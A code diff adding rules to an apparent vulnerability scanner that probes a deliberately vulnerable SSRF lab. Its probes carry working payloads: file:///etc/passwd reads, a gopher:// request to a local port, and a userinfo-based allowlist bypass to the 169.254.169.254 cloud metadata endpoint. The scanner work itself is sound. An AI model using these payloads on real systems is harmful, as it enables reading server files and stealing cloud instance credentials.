@@ -32436,6 +32436,133 @@ const ssrfVulnlabAllowlistRouteLiveOracle: Rule = async (ctx) => {
   };
 };
 
+const ssrfVulnlabSchemeLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const probeUrl = new URL("/scheme/", origin);
+  probeUrl.searchParams.set("url", "file:///etc/passwd");
+  const doc = await ssrfVulnlabFetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body);
+  if (!body) return NEGATIVE;
+  const passwdOk =
+    /^root:x:0:0:/m.test(body) &&
+    /\/bin\/(?:ba)?sh\b/m.test(body) &&
+    /nobody:x:/m.test(body);
+  if (!passwdOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: body.split("\n").slice(0, 4).join("\n").trim(),
+      note: "ssrf.vulnlab.dev GET /scheme/?url=file:///etc/passwd reads local files via unrestricted file:// scheme — URL-scheme SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabSchemeRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/scheme\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabSchemeLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabGopherLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const probeUrl = new URL("/gopher/", origin);
+  probeUrl.searchParams.set("url", "gopher://127.0.0.1:6479/_PING");
+  const doc = await ssrfVulnlabFetchDoc(probeUrl.toString(), { maxBytes: 16384, timeoutMs: 15000 });
+  if (doc.status < 200 || doc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(doc.body);
+  if (!body) return NEGATIVE;
+  const gopherOk =
+    /\+VULNLAB\{ssrf-gopher-pivot-to-redis-like-service\}/i.test(body) ||
+    (/VULNLAB\{/i.test(body) && /gopher|6479|PING/i.test(body));
+  if (!gopherOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      url: probeUrl.toString(),
+      snippet: body.slice(0, 240).trim(),
+      note: "ssrf.vulnlab.dev GET /gopher/?url=gopher://127.0.0.1:6479/_PING reaches a local TCP service via gopher:// — non-HTTP SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabGopherRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/gopher\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabGopherLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
+const ssrfVulnlabParserLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const origin = ssrfVulnlabProbeOrigin(ctx);
+  const blockedUrl = new URL("/parser/", origin);
+  blockedUrl.searchParams.set("url", "http://169.254.169.254@ssrf.vulnlab.dev/");
+  const blockedDoc = await ssrfVulnlabFetchDoc(blockedUrl.toString(), {
+    maxBytes: 4096,
+    timeoutMs: 15000
+  });
+  if (!/URL rejected|not in allowlist/i.test(blockedDoc.body)) return NEGATIVE;
+  const bypassUrl = new URL("/parser/", origin);
+  bypassUrl.searchParams.set(
+    "url",
+    "http://images.vulnlab.dev@169.254.169.254/latest/meta-data/"
+  );
+  const bypassDoc = await ssrfVulnlabFetchDoc(bypassUrl.toString(), {
+    maxBytes: 16384,
+    timeoutMs: 15000
+  });
+  if (bypassDoc.status < 200 || bypassDoc.status >= 400) return NEGATIVE;
+  const body = ssrfVulnlabLabBody(bypassDoc.body);
+  if (!body) return NEGATIVE;
+  const metadataOk =
+    /^ami-id\b/m.test(body) &&
+    /^iam\//m.test(body) &&
+    /^instance-id\b/m.test(body);
+  if (!metadataOk) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: 0.94,
+    evidence: {
+      blockedUrl: blockedUrl.toString(),
+      bypassUrl: bypassUrl.toString(),
+      snippet: body.split("\n").slice(0, 6).join("\n").trim(),
+      note: "ssrf.vulnlab.dev /parser rejects literal 169.254.169.254 host but accepts images.vulnlab.dev@169.254.169.254 userinfo bypass and returns AWS metadata — URL-parser disagreement SSRF oracle"
+    }
+  };
+};
+
+const ssrfVulnlabParserRouteLiveOracle: Rule = async (ctx) => {
+  if (!isSsrfVulnlabHost(ctx)) return NEGATIVE;
+  const pageUrl = ctx.scanUrl || ctx.home.finalUrl || "";
+  if (!/\/parser\b/i.test(pageUrl)) return NEGATIVE;
+  const result = await ssrfVulnlabParserLiveOracle(ctx);
+  if (!result.fired) return NEGATIVE;
+  return {
+    fired: true,
+    confidence: result.confidence,
+    evidence: { ...result.evidence, scannedUrl: pageUrl }
+  };
+};
+
 const juiceShopJwtAlgNoneLiveOracle: Rule = async (ctx) => {
   const corpus = `${ctx.origin}\n${ctx.scanUrl || ""}\n${ctx.home.finalUrl || ""}`;
   if (!JUICE_SHOP_HOST_RE.test(corpus)) return NEGATIVE;
@@ -39783,6 +39910,12 @@ export const RULES: Record<string, Rule> = {
   ssrfVulnlabRedirectRouteLiveOracle,
   ssrfVulnlabAllowlistBypassLiveOracle,
   ssrfVulnlabAllowlistRouteLiveOracle,
+  ssrfVulnlabSchemeLiveOracle,
+  ssrfVulnlabSchemeRouteLiveOracle,
+  ssrfVulnlabGopherLiveOracle,
+  ssrfVulnlabGopherRouteLiveOracle,
+  ssrfVulnlabParserLiveOracle,
+  ssrfVulnlabParserRouteLiveOracle,
   juiceShopJwtAlgNoneLiveOracle,
   juiceShopChatbotApiLiveOracle,
   juiceShopChatbotRouteLiveOracle,
